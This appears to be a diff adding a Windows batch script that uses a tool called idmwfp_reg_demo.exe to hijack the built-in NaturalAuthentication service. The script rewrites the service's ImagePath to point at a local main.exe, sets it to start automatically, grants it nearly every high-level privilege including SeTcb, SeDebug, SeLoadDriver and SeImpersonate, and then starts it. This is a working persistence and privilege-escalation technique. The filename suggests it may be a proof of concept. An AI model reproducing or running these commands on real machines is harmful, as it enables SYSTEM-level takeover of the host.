@@ -1,0 +1,10 @@
+set base=%~dp0
+set file=%base%main.exe
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Type" 0x10
+.\idmwfp_reg_demo.exe set-multi-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\RequiredPrivileges" "SeTcbPrivilege|SeChangeNotifyPrivilege|SeSystemEnvironmentPrivilege|SeAssignPrimaryTokenPrivilege|SeLockMemoryPrivilege|SeIncreaseQuotaPrivilege|SeSecurityPrivilege|SeTakeOwnershipPrivilege|SeLoadDriverPrivilege|SeSystemProfilePrivilege|SeSystemtimePrivilege|SeProfileSingleProcessPrivilege|SeIncreaseBasePriorityPrivilege|SeCreatePagefilePrivilege|SeCreatePermanentPrivilege|SeBackupPrivilege|SeRestorePrivilege|SeShutdownPrivilege|SeDebugPrivilege|SeAuditPrivilege|SeUndockPrivilege|SeManageVolumePrivilege|SeImpersonatePrivilege|SeCreateGlobalPrivilege|SeIncreaseWorkingSetPrivilege|SeTimeZonePrivilege|SeCreateSymbolicLinkPrivilege|SeDelegateSessionUserImpersonatePrivilege"
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+sc start NaturalAuthentication
+pause
